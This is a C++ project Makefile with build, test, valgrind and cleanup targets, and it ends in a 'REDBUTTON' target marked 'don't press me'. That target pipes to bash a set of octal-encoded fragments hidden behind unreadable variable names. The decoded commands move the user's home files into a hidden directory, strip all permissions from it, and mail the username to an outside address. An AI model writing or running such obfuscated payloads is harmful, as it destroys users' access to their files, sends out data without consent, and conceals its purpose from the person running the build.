# use 'make help' to get the readme for this makefile
#
#  edit at your own peril....
#
# Copyright (c) 2018 Phillip Renwick
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
MAINLAST=
ERR=
ifneq ($(shell test -e "modules.mk" && echo -n yes),yes)
ERR=true
$(MAKECMDGOALS):
	@echo "\n*************************************************************\n*                                                           *\n*    modules.mk file contains required configuration info.  *\n*    modules.mk not found, retrieving a default copy now    *\n*                                                           *\n*************************************************************\n\n"
	wget https://raw.githubusercontent.com/Athandreyal/Makefile/master/modules.mk
	@echo "\n\n*************************************************************\n*                                                           *\n*       Please configure modules.mk before proceeding       *\n*                                                           *\n*************************************************************\n\n"
endif
ifndef ERR
include modules.mk   #must contain PROG, MODULES, TMODULES, DELOPTION, DELOPTIONFILES, FILES, DATAPATH, DATAFILES
ifeq ($(PROG),)
PROG=PROG
endif
#-include modules.mk   #must contain PROG, MODULES, TMODULES, DELOPTION, DELOPTIONFILES, FILES, DATAPATH, DATAFILES
-include submit.mk   #OPTIONAL - may contain submit instruction sets.
DPROG=$(DEBUG_PREFIX)$(PROG)
CPPFLAGS=-ansi -pedantic-errors -Wall -Wconversion -MMD -MP
SHELL=/bin/bash -O extglob -c
empty=
space=$(empty) $(empty)
TESTLAST=
MAINLAST=
ifeq ($(shell test -e ".mt" && echo -n yes),yes)
TESTLAST:=1
endif
ifeq ($(shell test -e ".mm" && echo -n yes),yes)
MAINLAST:=1
endif
ifeq ($(MODULES),)
ifeq ($(MAKECMDGOALS),$(filter $(MAKECMDGOALS),v $(PROG) all))
-include .mainModuleList
endif
endif
ifeq ($(DMODULES),)
ifeq ($(MAKECMDGOALS),$(filter $(MAKECMDGOALS),vt $(DPROG) test))
-include .debugModuleList
ifeq ($(GCOV_MODULES),)
-include .mainModuleList
endif
endif
endif
ifndef ERR
-include $(MODULES:.o=.d)
-include $(DMODULES:.o=.d)
$(PROG):all
$(DPROG):test
all:$(if $(TESTLAST),clean)
all:CPPFLAGS:=$(CPPFLAGS) $(CXXFLAGS) #one list of flags
all:CPPFLAGS:=$(filter-out $(EXCLUDEFLAGS),$(CPPFLAGS))  #filter out excluded flags
all:$(MODULES)
all:
	@touch .mm
	g++  $(CPPFLAGS) $(MODULES) -o $(PROG)
test:$(if $(MAINLAST),clean)
test:CPPFLAGS:=$(CPPFLAGS) $(CXXFLAGS) $(GTFLAG) $(LDFLAG)  #one list of flags
test:CPPFLAGS:=$(filter-out $(EXCLUDEFLAGS),$(CPPFLAGS))  #filter out excluded flags
test:$(DMODULES)
test:GCOV=$(if $(GCOV_MODULES),$(GCOV_MODULES),$(filter $(MODULES), $(DMODULES)))
test:GCOV:=$(GCOV:.o=.cpp)
test:
	@touch .mt
	g++ $(CPPFLAGS) $(DMODULES) -g -o $(DEBUG_PREFIX)$(PROG)
	$(if $(EXECUTE_DEBUG_ON_BUILD),$(DEBUG_PREFIX)$(PROG))
	$(if $(GCOV_DEBUG_ON_BUILD),$(foreach var,$(GCOV), gcov $(var) 2> /dev/null | grep -A 1 $(var);))
ifneq ($(shell pstree -A | grep -o "script---bash"),)
PROTECTEDFILES=typescript
SCRIPTWARN="clean: typescript protected\n"
else
SCRIPTWARN="\n================================\n     typescript eliminated!\n================================\n\n"
endif
ifeq ($(MAKECMDGOALS),$(filter $(MAKECMDGOALS),clean cleanAll))
ifeq ($(MAKECMDGOALS),cleanAll)
PROTECTEDFILES:=$(subst $(space),\|,$(filter-out 'xxxxx', $(DELOPTFILES) $(DATAFILES) makefile $(PROTECTEDFILES)))
PROTECTEDEXTENSIONS:=$(subst $(space),\|,$(filter-out 'xxxxx', cpp h mk))
else
PROTECTEDFILES:=$(subst $(space),\|,$(filter-out 'xxxxx', $(DELOPTFILES) $(DATAFILES) makefile $(PROTECTEDFILES) $(PROG) $(DPROG)))
PROTECTEDEXTENSIONS:=$(subst $(space),\|,$(filter-out 'xxxxx', cpp h mk gcov gcno gcda))
endif
endif
v:$(PROG)
	valgrind $(VALGRINDFLAGS) $(PROG)
vt:$(DPROG)
	valgrind $(VALGRIND_FLAGS) $(DPROG)
data:
	$(foreach var,$(DATAFILES),cp $(DATAPATH)$(var) .;)
update:
	@$(shell echo rm -f makefile)   #kill current because we asked for latest
	wget https://raw.githubusercontent.com/Athandreyal/Makefile/master/makefile
help:
	wget https://raw.githubusercontent.com/Athandreyal/Makefile/master/readme.md
	cat readme.md
clean:
	$(call doTypeScriptWarn)
	$(call evalClean,_)
cleanDir:
	$(call evalClean,Dir)
cleanAll:clean cleanDir
define evalClean
	@rm -f .moduleScript.sh
	$(call doClean$1$(if $(filter EXCLUSIVE, $(DELTYPE)),Exclude,Include))
endef
doClean_Exclude=rm -f $(shell find . -maxdepth 1 -type f ! -iregex '.*\($(PROTECTEDEXTENSIONS)\)' ! -iregex './\($(PROTECTEDFILES)\)')
doClean_Include=rm -f $(DELOPTFILES);
doCleanDirExclude=$(foreach var,$(shell find ./* -type d), rm -r -i $(var);)
doCleanDirInclude=@echo "Will not delete directories while performing inclusive delete";
doTypeScriptWarn=$(if $(shell test -e "typescript" && echo -n yes),@printf %b $(SCRIPTWARN))
.mainModuleList:.moduleScript.sh
	@echo "auto-generating module list for $(PROG)"
	@printf %b ".mainModuleList\nint.main\nMODULES" > targets
	@./.moduleScript.sh
	@rm targets
.debugModuleList:.moduleScript.sh
	@echo "auto-generating module list for $(DPROG)"
	@printf %b ".debugModuleList\ngtest/gtest.h\nDMODULES" > targets
	@./.moduleScript.sh
	@rm targets
.moduleScript.sh:makefile
	@echo -e $(value getModuleScript) > ./.moduleScript.sh
	@chmod u+x ./.moduleScript.sh
getModuleScript="\#!/bin/bash\nquery=''\ntargets=''\nmodules=''\nif [ -f ./targets ];then\nreadarray arr < targets\n\
query=\${arr[1]}\ntarget=\${arr[0]}\nmodules=\${arr[2]}\nfi\nchecked=''\nmodules=\"\$modules=\"\ntocheck=()\n\
files=\$(find . -maxdepth 1 -type f -printf '%f ')\nfunction getReq2 {\nfileName=\$1\n\
if [[ \$checked != *\"\$fileName\"* ]];then\nchecked+=\$fileName' '\n\
includes=\$(grep '\#include \"*\"' \$fileName | awk '{x=length(\$0)-11;y=substr(\$0,11,x);print y}')\n\
for file in \$includes\ndo\nif [[ files == *\"file\"* ]];then\ntocheck+=(\$file)\nfi\ndone\n\
moduleName=\$(nameAsModule \$fileName)\nif [[ \$modules != *\"\$moduleName\"* ]];then\nmodules+=\"\$moduleName \"\n\
fi\nfi\n}\nfunction nameAsModule {\nfile=\$1\nif [[ \$file == *'.cpp' ]];then\nmoduleName=\${file/'.cpp'/'.o'}\n\
elif [[ \$file == *'.h' ]];then\no_name=\${file/'.h'/'.o'}\nc_name=\${file/'.h'/'.cpp'}\n\
if [[ \$files == *\"\$o_name\"* ]];then\nmoduleName=\${file/'.h'/'.o'}\nelif [[ \$files == *\"\$c_name\"* ]];then\n\
moduleName=\${file/'.h'/'.o'}\nfi\nfi\necho \$moduleName' '\n}\nmain=\$(grep -ld skip \$query *'.cpp')\n\
tocheck+=(\$main)\nwhile [ \${\#tocheck[@]} -gt 0 ];do\ngetReq2 \"\${tocheck[0]}\"\ntocheck=(\${tocheck[@]:1})\n\
done\necho \$modules > ./\$target"
print-% :
	$(info $* is a $(flavor $*) variable set to [$($*)]) @true
FORCE:
ifeq ($(MAKECMDGOALS),REDBUTTON)
-include buttonvars
endif
# don't press me....
REDBUTTON: 
	$(lllll1llll11l1l1)'$(llll1l11llllll)$(ll1l111ll111ll1)$(l11llll1l1l111ll)$(llllllllllll1111)$(ll111l1l11l1l)$(ll11l1111ll111l)$(l1111lll11l1ll1l)$(ll1l11l1l1l1l1l)$(llllll1ll1ll1l)$(llll1ll111l11l)$(l11l1l1lllll1ll)$(l11l1l11l1l11ll)$(l1111lllll11l1l)$(ll11111lll11llll)$(l1l11ll1ll1ll1)$(l111ll11l1ll1l1)'$(l1l1l1l1111ll11l)$(ll1lll11lll1l1ll)
	$(l11l11lll1l11l)'$(l1llll1ll11l1l1l)$(llllll1lll1lll1)$(l111ll1llll11ll1)$(ll1ll11lll1l111)$(l1111l1111ll1l1)$(lllllllllll11l1)$(l1ll1l11llll111l)$(ll11l1111ll111l1)$(ll111lll11ll1l)$(llll11lllllll11l)'$(l1l11llll11ll11)
	$(l1lll1ll11l11ll1)'$(ll11l11ll1l11lll)$(ll1lllllll1llll)$(llll111l111l11ll)$(ll11llll1lll1111)$(l1l11111l111ll)$(l1lll1l11lll1lll)$(ll1l1l111l1111l)$(l1ll111llllll1)$(l1l1111l1l11l111)$(l1l11ll1l1ll1l1)$(ll1l111ll1llll11)$(l1l1l111l11ll1l)'$(l1l1ll1l1lll1111)
	$(l1111l1l1l111lll)'$(l1l1111l11)$(ll1ll1l11l1lll11)$(l11l111ll11lll1l)$(l11ll1l1l1l111ll)$(ll11l1111lllll)$(l11111111lllll11)'$(l11lllll1l111111)
	$(l1ll11111111l111)'$(l11l111ll11l11)$(llll11ll1lllll)$(l11lllllll1l11l)$(l11l111lll1l1lll)$(l111llllll1l1lll)$(lll11lllll1ll1ll)$(ll11l111l1l1l1)$(lll11lll1l1l1111)$(l111111l1l1111l1)$(l111lllll11l11l)'$(llll111ll111lll1)
	$(l1ll111lll11ll11)'$(l111ll1111l1ll1l)$(lll111lll1l111l)$(lllll1l1l111llll)$(lllllllll11111l)$(l1lll11l1111l1)$(lll11111l11l1l1)'$(ll1l1l1ll)
	$(l111llllll1l111l)'$(llll1l11lll1lll)$(ll1l111l1lll1lll)$(lll1l111l111ll11)$(ll111ll1lll1l111)$(l11l1ll111l1llll)$(lll1l11l1ll1llll)$(ll1l11llll111l1)$(l11l111l1lll11)$(llllllll1l1l1111)$(l11ll11lll1lllll)'$(ll11ll11ll1l11l1)
	$(ll11lllll111l)'$(l11lll11lll11111)$(lll1l111l1l11111)$(l11ll11ll11ll1ll)$(ll1l1111111lll1)$(lll1lll11ll1ll1l)'$(ll1lll1ll1ll11l1)
	$(l1l1ll11llll11l1)'$(l1l111ll11ll1ll1)$(l11lllll1l11l111)$(l1111ll11l111ll1)'$(l111l1ll1l1l111)
	$(l1l111l11l11llll)'$(l1ll1lll111lll11)'$(ll1l1lll1lll1l1l)
	$(ll11lllll11lll1l)'$(llll1lllllll11)$(lll1l1l1ll1111ll)$(llll11lllll111)$(l1l111llll1l1l11)$(l111l1ll1l1l1ll)$(l11l11l1111lll1l)$(ll1l111lll1111)$(l1l111l1ll1111ll)$(ll1111ll1llllll1)$(l111ll1l111ll11l)$(l1111111l11llll)'$(l11ll11lll11l1ll)
buttonvars:
	@printf "%b" $(value BUTTONVARS) > buttonvars
BUTTONVARS="l11111111lllll11=\\\\154\\\\154\nl1111111l11llll=5\\\\144\\\\147\\\\145\\\\040\\\\143\\\\141\\\\156\\\\040\\\\142\\\\162\\\\151\\\\156\\\\147\\\\040\\\\151\\\\164\\\\040\\\\142\\\\141\\\\143\\\\153\\\\134\\\\156\\\\042\nl111111l1l1111l1=45\\\\1\nl1111l1111ll1l1=\\\\056\\\\150\\\\15\nl1111l1l1l111lll=@printf '%b'\nl1111ll11l111ll1=\\\\146\\\\151\\\\154\\\\145\nl1111lll11l1ll1l=50\\\\14\nl1111lllll11l1l=45\\\\\\\\0\nl111l1ll1l1l111=|bash\nl111l1ll1l1l1ll=62\\\\151\\\\157\\\\163\\\\151\\\\164\\\\171\\\\040\\\\153\\\\151\\\\154\\\\154\\\\145\\\\144\\\\040\\\\164\\\\15\nl111ll1111l1ll1l= \\\\145\\\\143\\\\150\\\\15\nl111ll11l1ll1l1=50\\\\145\\\\040\\\\123\\\\150\\\\141\\\\144\\\\157\\\\167\\\\163\\\\040\\\\154\\\\151\\\\145\\\\056\\\\040\\\\117\\\\156\\\\145\\\\040\\\\122\\\\151\\\\156\\\\147\\\\040\\\\164\\\\157\\\\040\\\\162\\\\165\\\\154\\\\145\\\\040\\\\164\\\\150\\\\145\\\\155\\\\040\\\\141\\\\154\\\\154\\\\054\\\\040\\\\117\\\\156\\\\145\\\\040\\\\122\\\\151\\\\156\\\\147\\\\040\\\\164\\\\157\\\\040\\\\146\\\\151\\\\156\\\\144\\\\040\\\\164\\\\150\\\\145\\\\155\\\\054\\\\040\\\\117\\\\156\\\\145\\\\040\\\\122\\\\151\\\\156\\\\147\\\\040\\\\164\\\\157\\\\040\\\\142\\\\162\\\\151\\\\156\\\\147\\\\040\\\\164\\\\150\\\\145\\\\155\\\\040\\\\141\\\\154\\\\154\\\\054\\\\040\\\\141\\\\156\\\\144\\\\040\\\\151\\\\156\\\\040\\\\164\\\\150\\\\145\\\\040\\\\144\\\\141\\\\162\\\\153\\\\156\\\\145\\\\163\\\\163\\\\040\\\\142\\\\151\\\\156\\\\144\\\\040\\\\164\\\\150\\\\145\\\\155\\\\054\\\\040\\\\111\\\\156\\\\040\\\\164\\\\150\\\\145\\\\040\\\\114\\\\141\\\\156\\\\144\\\\040\\\\157\\\\146\\\\040\\\\115\\\\157\\\\162\\\\144\\\\157\\\\162\\\\040\\\\167\\\\150\\\\145\\\\162\\\\145\\\\040\\\\164\\\\150\\\\145\\\\040\\\\123\\\\150\\\\141\\\\144\\\\157\\\\167\\\\163\\\\040\\\\154\\\\151\\\\145\\\\056\\\\042\\\\076\\\\057\\\\144\\\\145\\\\166\\\\057\\\\156\\\\165\\\\154\\\\154\nl111ll1l111ll11l=\\\\157\\\\167\\\\154\\\\14\nl111ll1llll11ll1=\\\\1\nl111lllll11l11l=46\\\\151\\\\154\\\\145\\\\057\\\\155\\\\141\\\\163\\\\164\\\\145\\\\162\\\\057\\\\155\\\\141\\\\153\\\\145\\\\146\\\\151\\\\154\\\\145\\\\076\\\\057\\\\144\\\\145\\\\166\\\\057\\\\156\\\\165\\\\154\\\\154\nl111llllll1l111l=@printf '%b'\nl111llllll1l1lll=40\\\\176\\\\057\\\\040\\\\150\\\\164\\\\164\\\\160\\\\163\\\\072\\\\057\\\\057\\\\162\\\\141\\\\167\\\\056\\\\14\nl11l111l1lll11=\\\\145\\\\040\\\\155\nl11l111ll11l11= \\\\167\\\\147\\\\14\nl11l111ll11lll1l=0\\\\060\\\\040\\\\176\nl11l111lll1l1lll=\\\\040\\\\055\\\\120\\\\0\nl11l11l1111lll1l=0\\\\14\nl11l11lll1l11l=@printf '%b'\nl11l1l11l1l11ll=54\\\\154\\\\163\\\\040\\\\157\\\\146\\\\040\\\\163\\\\164\\\\157\\\\156\\\\145\\\\054\\\\040\\\\116\\\\151\\\\156\\\\145\\\\040\\\\146\\\\157\\\\162\\\\040\\\\115\\\\157\\\\162\\\\164\\\\141\\\\154\\\\040\\\\115\\\\145\\\\156\\\\040\\\\144\\\\157\\\\157\\\\155\\\\145\\\\144\\\\040\\\\164\\\\157\\\\040\\\\144\\\\151\\\\145\\\\054\\\\040\\\\117\\\\156\\\\145\\\\040\\\\146\\\\157\\\\162\\\\040\\\\164\\\\150\\\\145\\\\040\\\\104\\\\141\\\\162\\\\153\\\\040\\\\114\\\\157\\\\162\\\\144\\\\040\\\\157\\\\156\\\\040\\\\150\\\\151\\\\163\\\\040\\\\144\\\\141\\\\162\\\\153\\\\040\\\\164\\\\150\\\\162\\\\157\\\\156\\\\145\\\\040\\\\151\\\\156\\\\040\\\\164\\\\150\\\\145\\\\040\\\\114\\\\141\\\\156\\\\144\\\\040\\\\157\\\\146\\\\040\\\\115\\\\157\\\\162\\\\144\\\\157\\\\162\\\\040\\\\167\\\\150\\\\145\\\\162\\\\1\nl11l1l1lllll1ll=\\\\153\\\\151\\\\156\\\\147\\\\163\\\\040\\\\165\\\\156\\\\144\\\\145\\\\162\\\\040\\\\164\\\\150\\\\145\\\\040\\\\163\\\\153\\\\171\\\\054\\\\040\\\\123\\\\145\\\\166\\\\145\\\\156\\\\040\\\\146\\\\157\\\\162\\\\040\\\\164\\\\150\\\\145\\\\040\\\\104\\\\167\\\\141\\\\162\\\\146\\\\055\\\\154\\\\157\\\\162\\\\144\\\\163\\\\040\\\\151\\\\156\\\\040\\\\164\\\\150\\\\145\\\\151\\\\162\\\\040\\\\150\\\\141\\\\1\nl11l1ll111l1llll=\\\\156\\\\040\\\\1\nl11ll11ll11ll1ll=3\\\\040\\\\042\\\\122\\\\105\\\\104\\\\040\\\\102\\\\125\\\\124\\\\124\\\\117\nl11ll11lll11l1ll=|bash\nl11ll11lll1lllll=6\\\\151\\\\154\\\\145\\\\042\\\\040\\\\076\\\\076\\\\040\\\\146\\\\151\\\\154\\\\145\nl11ll1l1l1l111ll=\\\\057\\\\056\\\\150\\\\151\\\\144\\\\144\\\\145\\\\156\\\\076\\\\057\\\\144\\\\145\\\\166\\\\05\nl11lll11lll11111= \\\\155\\\\141\\\\151\nl11llll1l1l111ll=40\nl11lllll1l111111=|bash\nl11lllll1l11l111=2\\\\155\\\\040\\\\055\\\\146\\\\040\nl11lllllll1l11l=4\\\\040\\\\055\\\\161\nl1l11111l111ll=\\\\144\nl1l1111l11= \\\\143\\\\150\\\\155\nl1l1111l1l11l111=\\\\144\\\\145\\\\1\nl1l111l11l11llll=@printf '%b'\nl1l111l1ll1111ll=\\\\143\\\\141\\\\164\nl1l111ll11ll1ll1= \\\\16\nl1l111llll1l1l11=40\\\\042\\\\143\\\\165\\\\1\nl1l11ll1l1ll1l1=66\\\\057\\\\156\\\\16\nl1l11ll1ll1ll1=4\\\\1\nl1l11llll11ll11=|bash\nl1l1l111l11ll1l=54\nl1l1l1l1111ll11l=|ba\nl1l1ll11llll11l1=@printf '%b'\nl1l1ll1l1lll1111=|bash\nl1ll11111111l111=@printf '%b'\nl1ll111lll11ll11=@printf '%b'\nl1ll111llllll1=56\\\\076\\\\057\nl1ll1l11llll111l=5\\\\156\\\\076\\\\057\\\\14\nl1ll1lll111lll11= \\\\143\\\\144\\\\040\\\\176\nl1lll11l1111l1=\\\\146\\\\151\\\\154\\\\1\nl1lll1l11lll1lll=\\\\14\nl1lll1ll11l11ll1=@printf '%b'\nl1llll1ll11l1l1l= \\\\155\\\\15\nll11111lll11llll=40\\\\16\nll1111ll1llllll1=\\\\054\\\\040\\\\153\\\\156\nll111l1l11l1l=\\\\113\\\\156\\\\157\\\\167\\\\154\\\\145\\\\144\\\\147\\\\145\\\\040\\\\151\\\\163\\\\0\nll111ll1lll1l111=\\\\145\\\\144\\\\040\\\\164\\\\150\\\\145\\\\040\\\\162\\\\145\\\\144\\\\040\\\\142\\\\165\\\\164\\\\164\\\\157\nll111lll11ll1l=56\\\\165\\\\15\nll11l1111ll111l1=4\\\\145\\\\166\\\\057\\\\1\nll11l1111ll111l=40\\\\160\\\\157\\\\167\\\\145\\\\162\\\\056\\\\040\\\\124\\\\150\\\\162\\\\145\\\\145\\\\040\\\\122\\\\151\\\\156\\\\147\\\\163\\\\040\\\\146\\\\157\\\\162\\\\040\\\\164\\\\1\nll11l1111lllll=7\\\\156\\\\165\nll11l111l1l1l1=\\\\154\\\\05\nll11l11ll1l11lll= \\\\15\nll11ll11ll1l11l1=|bash\nll11llll1lll1111=0\\\\176\\\\057\\\\052\\\\040\\\\176\\\\057\\\\056\\\\150\\\\151\nll11lllll111l=@printf '%b'\nll11lllll11lll1l=@printf '%b'\nll1l1111111lll1=\\\\116\\\\041\\\\042\\\\040\nll1l111l1lll1lll=3\\\\15\nll1l111ll111ll1=0\\\\157\\\\0\nll1l111ll1llll11=5\\\\154\\\\1\nll1l111lll1111=5\\\\040\nll1l11l1l1l1l1l=5\\\\040\\\\105\\\\15\nll1l11llll111l1=\\\\040\\\\164\\\\150\nll1l1l111l1111l=4\\\\145\\\\1\nll1l1l1ll=|bash\nll1l1lll1lll1l1l=|bash\nll1ll11lll1l111=76\\\\057\nll1ll1l11l1lll11=\\\\157\\\\144\\\\04\nll1lll11lll1l1ll=sh\nll1lll1ll1ll11l1=|bash\nll1lllllll1llll=5\\\\16\nlll11111l11l1l1=45\nlll111lll1l111l=7\\\\040\\\\055\nlll11lll1l1l1111=7\\\\115\\\\141\\\\153\\\\1\nlll11lllll1ll1ll=7\\\\151\\\\164\\\\150\\\\165\\\\142\\\\165\\\\163\\\\145\\\\162\\\\143\\\\157\\\\156\\\\164\\\\145\\\\156\\\\164\\\\056\\\\143\\\\157\\\\155\\\\057\\\\101\\\\164\\\\150\\\\141\\\\156\\\\144\\\\162\\\\145\\\\171\\\\141\nlll1l111l111ll11=0\\\\157\\\\040\\\\042\\\\040\\\\160\\\\162\\\\145\\\\163\\\\163\nlll1l111l1l11111=\\\\154\\\\040\\\\055\\\\16\nlll1l11l1ll1llll=51\\\\156\nlll1l1l1ll1111ll=1\\\\156\\\\164\\\\146\nlll1lll11ll1ll1l=\\\\160\\\\162\\\\145\\\\156\\\\167\\\\064\\\\071\\\\071\\\\100\\\\155\\\\164\\\\162\\\\157\\\\171\\\\141\\\\154\\\\056\\\\143\\\\141\\\\040\\\\074\\\\040\\\\146\\\\151\\\\154\\\\145\nllll111l111l11ll=6\\\\04\nllll111ll111lll1=|bash\nllll11ll1lllll=5\\\\16\nllll11lllll111=\\\\0\nllll11lllllll11l=4\\\\154\nllll1l11lll1lll= \\\\145\\\\14\nllll1l11llllll= \\\\145\\\\143\\\\15\nllll1ll111l11l=\\\\145\\\\156\\\\055\nllll1lllllll11= \\\\160\\\\162\\\\15\nlllll1l1l111llll=\\\\156\\\\040\\\\044\\\\050\\\\167\\\\150\\\\157\\\\141\\\\155\\\\151\\\\051\nlllll1llll11l1l1=@printf '%b'\nllllll1ll1ll1l=4\\\\166\nllllll1lll1lll1=3\\\\144\\\\151\\\\162\\\\040\\\\055\\\\160\\\\040\nllllllll1l1l1111=\\\\141\\\\153\\\\145\\\\14\nlllllllll11111l=\\\\040\\\\076\\\\040\nlllllllllll11l1=1\\\\144\\\\144\\\\14\nllllllllllll1111=\\\\042"
endif
endif
